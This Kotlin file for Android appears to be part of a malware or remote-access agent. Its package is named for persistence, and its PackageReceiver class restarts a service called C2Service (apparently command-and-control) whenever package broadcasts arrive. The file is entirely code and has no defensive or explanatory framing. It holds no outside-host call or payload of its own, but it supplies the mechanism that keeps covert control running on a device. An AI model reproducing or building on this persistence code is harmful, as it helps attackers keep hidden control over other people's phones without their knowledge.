package ai.obsidian.agent.persist

import ai.obsidian.agent.svc.C2Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class PackageReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_PACKAGE_REMOVED &&
            intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)
        ) return
        C2Service.start(context)
    }
}
